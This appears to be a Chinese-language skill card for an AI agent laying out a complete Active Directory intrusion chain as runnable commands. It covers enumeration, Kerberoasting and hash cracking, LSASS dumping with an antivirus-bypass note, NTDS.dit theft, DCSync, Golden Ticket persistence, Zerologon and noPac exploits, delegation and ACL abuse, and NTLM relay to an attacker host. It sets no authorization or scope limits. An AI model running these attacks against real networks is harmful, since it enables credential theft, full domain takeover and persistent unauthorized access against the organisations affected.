---
name: 武庸·窗府
description: >-
 Windows Active Directory 域渗透全链：入域侦察 → 枚举 → Kerberoasting →
 凭证转储 → DCSync → 域控攻陷。
version: 1.0.0
---

> **武庸**
> 永生缥缈非我求，长生无为老愧羞。
> 凡夫俗子岂识我，非到末路不甘休！

# Windows AD 域渗透全链

## 触发条件

：
- Active Directory、域渗透、AD 渗透、域控攻陷
- BloodHound、SharpHound、PowerView、ADFind
- 域信息收集、SPN 扫描、LDAP 枚举
- 域控 DC、NTDS.dit、域管理员
- Pass-the-Hash/Ticket、横向移动 + 域
- 凭证转储 + Windows

Kerberoasting / AS-REP / ADCS / Golden Ticket 有独立 Skill，本卡负责整体流程串联。

---

## 攻击链概览

```
入域(低权) → 枚举(BloodHound/PowerView) → 凭证获取(Kerberoast/Dump)
 → 横向移动(PtH/PtT/CME) → 域控(DCSync) → 持久化(Golden Ticket)
```

---

## 阶段 1：入域信息收集（不需要域账号）

```powershell
# 快速判断是否在域内
systeminfo | findstr /B "Domain"
net config workstation
echo %USERDNSDOMAIN%

# LDAP 匿名查询（有时无需认证）
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

```bash
# 外部：Nmap 枚举域信息
nmap -p 389,636,3268,3269,88,445 --script ldap-rootdse <DC_IP>
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=CORP.LOCAL <DC_IP>

# enum4linux-ng（无需凭证时）
enum4linux-ng -A <DC_IP>
```

---

## 阶段 2：域内枚举（有普通域账号）

### 2.1 PowerView 快速枚举

```powershell
# 绕过执行策略加载
powershell -ep bypass
. .\PowerView.ps1

# 基础域信息
Get-Domain
Get-DomainController
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# 用户枚举
Get-DomainUser | Select-Object samaccountname, description, memberof
Get-DomainUser -SPN # 找 Kerberoastable 账户（有 SPN）
Get-DomainUser -PreauthNotRequired # 找 AS-REP Roastable 账户

# 组枚举
Get-DomainGroup "Domain Admins" | Select-Object member
Get-DomainGroupMember "Domain Admins" -Recurse

# 共享枚举
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.txt,*.xml,*.config,*.ps1

# GPO 枚举（找密码、脚本）
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
Get-DomainGPOLocalGroup # 本地管理员组 GPO
```

### 2.2 BloodHound 数据采集

```powershell
# SharpHound — 全量采集
.\SharpHound.exe -c All -d CORP.LOCAL --OutputDirectory C:\Temp\

# 或 PowerShell 版
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain CORP.LOCAL -OutputDirectory C:\Temp\
```

```bash
# Python 版（适合 Linux 攻击机）
bloodhound-python -u lowpriv -p 'Password1' -d CORP.LOCAL -ns <DC_IP> -c All --zip
```

```cypher
-- BloodHound 关键查询
-- 最短到 DA 路径
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- 所有 Kerberoastable 账户
MATCH (u:User {hasspn:true}) RETURN u.name, u.description ORDER BY u.name

-- ACL 滥用路径（WriteDACL/GenericAll）
MATCH p=(u:User)-[:GenericAll|WriteDACL|WriteOwner|GenericWrite]->(t) RETURN p LIMIT 50

-- 查找可 AS-REP Roast 账户
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

### 2.3 ADFind 枚举

```bat
:: 查询所有用户
AdFind.exe -f "(objectClass=user)" sAMAccountName description memberOf

:: 查询所有组
AdFind.exe -f "(objectClass=group)" cn member

:: 查询域信任
AdFind.exe -f "(objectClass=trustedDomain)" -dn
```

---

## 阶段 3：凭证获取

### 3.1 Kerberoasting → 详见 `kerberos-attack` Skill

```bash
# Impacket：一键 Kerberoast
GetUserSPNs.py CORP.LOCAL/lowpriv:Password1 -dc-ip <DC_IP> -request -outputfile kerberoast.hashes

# 离线破解
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

### 3.2 LSASS 转储（需本地管理员）

```powershell
# Task Manager / Process Explorer 图形界面 → 创建转储文件

# 命令行（mimikatz）
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 绕过 AV：使用 ProcDump（微软签名工具）
ProcDump.exe -ma lsass.exe lsass.dmp
# 再到攻击机分析
python3 pypykatz/pypykatz.py lsa minidump lsass.dmp

# 使用 CrackMapExec
crackmapexec smb <TARGET> -u admin -p 'Pass' --lsa
crackmapexec smb <TARGET> -u admin -p 'Pass' -M lsassy
```

### 3.3 NTDS.dit 提取（域控上）

```powershell
# VSS 卷影拷贝法
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\
```

```bash
# 攻击机解密
secretsdump.py -ntds NTDS.dit -system SYSTEM -security SECURITY LOCAL
# 或直接远程（域管权限）
secretsdump.py CORP.LOCAL/Administrator:'Pass'@<DC_IP>
```

---

## 阶段 4：DCSync（无需登录域控，需 DS-Replication-Get-Changes-All）

```bash
# Impacket（在攻击机直接运行）
secretsdump.py CORP.LOCAL/Administrator@<DC_IP> -just-dc-user krbtgt
secretsdump.py CORP.LOCAL/Administrator@<DC_IP> -just-dc # 全量

# 结果：获取 krbtgt NTLM hash → 可伪造 Golden Ticket
```

```powershell
# Mimikatz DCSync（在域内机器上）
.\mimikatz.exe "lsadump::dcsync /user:Administrator /domain:CORP.LOCAL" "exit"
.\mimikatz.exe "lsadump::dcsync /all /domain:CORP.LOCAL /csv" "exit"
```

---

## 阶段 5：域控攻陷 — Golden Ticket 持久化

```bash
# 1. 获取域 SID 和 krbtgt hash（DCSync 后）
# krbtgt NTLM: aabbcc...
# Domain SID: S-1-5-21-xxxxx

# 2. 伪造 Golden Ticket（Impacket）
ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-xxx -domain CORP.LOCAL Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass CORP.LOCAL/Administrator@<DC_IP>
```

```powershell
# Mimikatz 方式
.\mimikatz.exe
kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
# 验证
klist
dir \\DC01\C$
```

---

## 阶段 6：CVE 快捷路径

### 6.1 Zerologon（CVE-2020-1472）— 无需凭证攻陷域控

```bash
# 步骤1：确认漏洞（impacket）
python3 cve-2020-1472-exploit.py <DC_BIOS_NAME> <DC_IP>
# 若无报错/显示 vulnerable = 存在

# 步骤2：清空 DC 机器账户密码（exploit）
python3 cve-2020-1472-exploit.py <DC_BIOS_NAME> <DC_IP>

# 步骤3：转储所有 hash（无密码认证）
secretsdump.py <domain>/<DC_BIOS_NAME>\$@<DC_IP> -no-pass -just-dc-user Administrator

# 步骤4：用 Admin hash 进一步转储
secretsdump.py -hashes :<NTLM_ADMIN_HASH> <domain>/Administrator@<DC_IP>

# 步骤5：还原 DC 机器账户密码（重要！否则域功能受损）
python3 restorepassword.py -target-ip <DC_IP> \
  <domain>/<DC_BIOS_NAME>@<DC_BIOS_NAME> -hexpass <hex_password>
```

```powershell
# 或用 mimikatz（域内机器上）
# Check
mimikatz "lsadump::zerologon /target:dc1.corp.local /account:dc1$" exit
# Exploit
mimikatz "lsadump::zerologon /target:dc1.corp.local /account:dc1$ /exploit" exit
# DCSync（空密码认证）
mimikatz "lsadump::dcsync /dc:dc1.corp.local /authuser:dc1$ /authdomain:corp.local /authpassword:'' /domain:corp.local /authntlm /user:krbtgt" exit
# Restore
mimikatz "lsadump::postzerologon /target:corp.local /account:dc1$" exit
```

### 6.2 noPac（CVE-2021-42278 + CVE-2021-42287）— 普通域用户到 DA

```bash
# noPac.exe（Windows，普通域账号即可）
.\noPac.exe -domain <domain> -user <lowpriv_user> -pass '<password>' \
  /dc <dc_fqdn> /mAccount <machine_account_name> /mPassword <machine_pass> \
  /service cifs /ptt
# 成功后直接 dir \\DC\C$ 验证

# sam-the-admin（Python，Linux 攻击机）
python3 sam_the_admin.py -dc-ip <DC_IP> '<domain>/<user>:<pass>' -shell
```

---

## 阶段 7：Kerberos 委派攻击

### 7.1 非约束委派（Unconstrained Delegation）

**原理**：配置了非约束委派的主机会缓存连接它的用户 TGT，可提取后伪造任何服务。

```powershell
# 枚举非约束委派主机（PowerView）
Get-DomainComputer -Unconstrained -Properties DnsHostName
Get-NetComputer -Unconstrained

# BloodHound 查询
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

```powershell
# 在非约束委派主机上等待域控连接并提取 TGT
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# 配合打印机漏洞强制 DC 连接（需在委派主机上运行）
.\MS-RPRN.exe \\<DC_FQDN> \\<委派主机_FQDN>
# 或 PetitPotam
python3 PetitPotam.py -d <domain> <委派主机IP> <DC_IP>

# 提取 DC 的 TGT 后 DCSync
.\mimikatz.exe "kerberos::ptt <dc_tgt.kirbi>" exit
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

### 7.2 约束委派（Constrained Delegation）

**原理**：主机/账号被允许代表用户访问指定服务（S4U2Self + S4U2Proxy）。

```powershell
# 枚举约束委派主机/账号
Get-DomainComputer -TrustedToAuth -Properties DnsHostName,msDS-AllowedToDelegateTo
Get-DomainUser -TrustedToAuth -Properties SamAccountName,msDS-AllowedToDelegateTo

# BloodHound 查询
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
```

```bash
# 用约束委派账号的 hash 申请服务票据（冒充 Administrator）
getST.py -spn cifs/<目标_FQDN> \
  -impersonate Administrator \
  -hashes :<委派账号_NTLM_hash> \
  <domain>/<委派账号>
export KRB5CCNAME=Administrator@cifs_<目标>.ccache
psexec.py -k -no-pass <domain>/Administrator@<目标_FQDN>
```

```powershell
# Rubeus 方式（域内 Windows）
.\Rubeus.exe s4u /user:<委派账号> /rc4:<NTLM_hash> \
  /impersonateuser:Administrator /msdsspn:cifs/<目标_FQDN> /ptt
```

### 7.3 基于资源的约束委派（RBCD）

**原理**：目标主机的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性可被写入者修改，允许任意主机代理认证（只需对目标有 GenericWrite/WriteProperty）。

```powershell
# 步骤1：创建/找到攻击者控制的机器账户（或用已有弱密码机器账户）
.\Impacket\addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'Atk@1234' \
  -dc-ip <DC_IP> <domain>/<lowpriv_user>:<pass>

# 步骤2：查找对目标主机有写权限的账户（PowerView）
Get-DomainObjectAcl -Identity <目标主机> -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty" }

# 步骤3：写入 RBCD（让 ATTACKPC$ 可代理到目标）
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-xxx-<ATTACKPC_SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject <目标主机> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 步骤4：用 ATTACKPC$ 申请冒充 Administrator 的票据
getST.py -spn cifs/<目标_FQDN> -impersonate Administrator \
  -hashes :<ATTACKPC_NTLM> <domain>/ATTACKPC\$
export KRB5CCNAME=Administrator@cifs_<目标>.ccache
secretsdump.py -k -no-pass <domain>/Administrator@<目标_FQDN>
```

---

## 阶段 8：AD ACL 攻击

**原理**：域内对象 ACL 配置错误时，低权用户可通过 ACE 实现提权（WriteDACL/GenericAll/GenericWrite/WriteOwner 等）。

### 8.1 枚举 ACL 权限

```powershell
# BloodHound 查询最短 ACL 提权路径
MATCH p=shortestPath((u:User {name:"LOWPRIV@CORP.LOCAL"})-[r:GenericAll|GenericWrite|WriteOwner|WriteDACL|Owns|ForceChangePassword|AddMember*1..]->(t)) RETURN p

# PowerView 枚举特定用户的 ACL
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq "lowpriv" }
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

### 8.2 各类 ACE 利用方法

```powershell
# GenericAll on User → 强制修改密码
Set-DomainUserPassword -Identity <目标用户> -AccountPassword (ConvertTo-SecureString "NewPass@1" -AsPlainText -Force)

# GenericAll on Group → 添加成员
Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv

# GenericWrite on User → 修改 SPN（再 Kerberoast）
Set-DomainObject -Identity <目标用户> -Set @{serviceprincipalname='fake/spn'}
GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/lowpriv:pass

# WriteOwner → 将自己设为对象 Owner，再 WriteDACL
Set-DomainObjectOwner -Identity <目标> -OwnerIdentity lowpriv
Add-DomainObjectAcl -TargetIdentity <目标> -PrincipalIdentity lowpriv -Rights All

# WriteDACL on Domain → 给自己 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity lowpriv -Rights DCSync

# ForceChangePassword → 强制重置目标密码
$cred = New-Object System.Management.Automation.PSCredential("corp\lowpriv", (ConvertTo-SecureString "LowPass@1" -AsPlainText -Force))
Set-DomainUserPassword -Identity <目标> -AccountPassword (ConvertTo-SecureString "HackPass@1" -AsPlainText -Force) -Credential $cred
```

```bash
# aclpwn.py（自动化 ACL 提权路径）
# https://github.com/fox-it/aclpwn.py
python aclpwn.py -f lowpriv -ft user -t domain -d corp.local \
  -du lowpriv -dp 'pass' -server <DC_IP>
```

### 8.3 Exchange 漏洞辅助提权（NTLM Relay）

```bash
# privexchange（Exchange 向攻击机发起 NTLM 认证）
python privexchange.py -ah <攻击机IP> <exchange_host> \
  -u <user> -d <domain> -p <pass>

# 同时运行 ntlmrelayx（relay 到 LDAP，提升用户权限）
ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <lowpriv_user>
```

**Exchange CVE 速查**：

| CVE | 说明 | 利用 |
|---|---|---|
| CVE-2018-8581 | EWS SSRF → NTLM Relay | privexchange |
| CVE-2019-1040 | NTLM relay 绕过 MIC | ntlmrelayx + CVE-2019-1040 |
| CVE-2020-0688 | 反序列化 RCE（需 OWA 低权） | ysoserial.net |
| CVE-2021-26855 | ProxyLogon SSRF+RCE | proxyshell 工具 |

---

## 快速路径备忘

| 场景 | 工具链 |
|------|--------|
| 只有低权域账号 | BloodHound → PowerView → Kerberoast → hashcat |
| 有本地管理员 | CME --lsa / mimikatz → PtH 横向 |
| 有域管 | DCSync → Golden Ticket |
| 无凭证（网络访问）| Zerologon(CVE-2020-1472) → NTDS.dit |
| 域内机器 SYSTEM | AD CS ESC1-ESC8 → 详见 `adcs-pentest` Skill |

---

## 关键工具安装

```bash
# Impacket
pip install impacket

# BloodHound（macOS）
brew install bloodhound

# CrackMapExec
pipx install crackmapexec

# PowerView（下载）
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```

---

## 证据落盘

```bash
# 落盘到案卷
mkdir -p 案卷/<案卷>/接管/ad/
# 存放：BloodHound zip / secretsdump 输出 / 截图
```

参考：`智道藏书/三十九门/32-印绶/skills/AD域安全与攻击路径分析-ADSecurityAttackPathAnalysis.md` 
配套：`kerberos-attack` · `adcs-pentest` · `smb-lateral-movement` · `windows-lpe`

## 真源

- 工具：`python3 炼蛊房/ad_surface_check.py --help`
